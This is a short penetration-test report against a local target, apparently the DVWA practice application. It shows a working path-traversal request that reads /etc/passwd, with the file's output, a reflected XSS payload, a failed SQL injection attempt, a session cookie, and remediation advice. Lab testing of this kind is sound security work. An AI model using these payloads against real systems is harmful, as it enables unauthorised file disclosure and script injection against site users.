Target: localhost:8085

Summary of Exploitation Results (using cookie: PHPSESSID=v598p6729sv72rech995irldm2; security=low)

1. Local File Inclusion (LFI):
- Successfully exploited LFI at /vulnerabilities/fi/?page=../../../../../../../../../../etc/passwd
- Output shows contents of /etc/passwd, confirming the vulnerability:
  Example:
  root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
  ...

2. Reflected Cross-Site Scripting (XSS):
- Successfully exploited XSS at /vulnerabilities/xss_r/?name='&gt;"&lt;svg/onload=confirm('xss-name')&gt;
- Output shows the payload reflected in the response, confirming the vulnerability:
  <pre>Hello '&gt;"&lt;svg/onload=confirm('xss-name')&gt;</pre>

3. SQL Injection (SQLi):
- The SQLi exploitation attempt did not complete due to a file path or output directory issue. Manual verification is recommended.

Conclusion:
- The target is confirmed vulnerable to LFI and Reflected XSS using the provided session cookie.
- SQLi exploitation should be re-attempted with correct output directory permissions.
- These vulnerabilities allow for sensitive file disclosure and client-side script injection, which can be leveraged for further attacks.

Recommendations:
- Immediately remediate LFI and XSS vulnerabilities.
- Review application input validation and output encoding.
- Conduct further manual testing for SQLi and other vulnerabilities.
